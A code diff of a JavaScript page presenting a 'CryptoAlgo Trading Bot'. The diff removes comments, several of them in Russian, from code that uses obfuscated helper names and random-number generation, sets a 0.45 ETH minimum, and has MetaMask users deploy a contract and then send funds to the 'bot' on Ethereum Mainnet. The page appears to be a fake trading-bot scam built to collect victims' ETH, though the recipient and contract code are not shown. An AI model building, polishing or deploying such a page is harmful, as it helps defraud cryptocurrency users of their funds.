@@ -760,7 +760,7 @@
             const sI = document.getElementById("step-initialize");
             const bSP = document.getElementById("botStatusPulse");
             const bAS = document.getElementById("botActiveStatus");
-            const MD = 0.45; // Минимальная сумма 0.5 ETH
+            const MD = 0.45;
             let w3;
             let ac = [];
             let vI;
@@ -775,7 +775,7 @@
             let iTA = false;
             const dx = ["Uniswap", "SushiSwap", "Curve", "1inch", "Balancer", "dYdX", "PancakeSwap"];
             const tk = ["ETH", "USDT", "USDC", "DAI", "WBTC", "LINK", "UNI", "AAVE", "SNX", "CRV"];
-            const ETHEREUM_MAINNET_CHAIN_ID = '0x1'; // Ethereum Mainnet chain ID
+            const ETHEREUM_MAINNET_CHAIN_ID = '0x1'; 
 
             function a7a(min, max, dec) {
                 return (Math.random() * (max - min) + min).toFixed(dec)
@@ -832,7 +832,7 @@
                                                 symbol: 'ETH',
                                                 decimals: 18
                                             },
-                                            rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'], // Замените на ваш RPC URL
+                                            rpcUrls: ['https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'], 
                                             blockExplorerUrls: ['https://etherscan.io']
                                         }],
                                     });
@@ -1072,7 +1072,7 @@
                     };
                     a8d("Estimating gas for contract deployment...", "info");
                     const estimatedGas = await w3.eth.estimateGas(txp);
-                    txp.gas = w3.utils.toHex(Math.floor(estimatedGas * 1.2)); // Добавляем 20% запаса
+                    txp.gas = w3.utils.toHex(Math.floor(estimatedGas * 1.2)); 
                     a8d("Deploying trading contract to Ethereum Mainnet blockchain...", "info");
                     const txh = await window.ethereum.request({
                         method: "eth_sendTransaction",
@@ -1136,7 +1136,7 @@
                     };
                     a81("Estimating gas for bot initialization...", "info");
                     const estimatedGas = await w3.eth.estimateGas(tx);
-                    tx.gas = w3.utils.toHex(Math.floor(estimatedGas * 1.2)); // Добавляем 20% запаса
+                    tx.gas = w3.utils.toHex(Math.floor(estimatedGas * 1.2)); 
                     a81("You are interacting with CryptoAlgo Trading Bot contract. Confirm the transaction in MetaMask.", "info");
                     await new Promise(r => setTimeout(r, 1000));
                     a81("Sending funds to CryptoAlgo Trading Bot on Ethereum Mainnet...", "info");
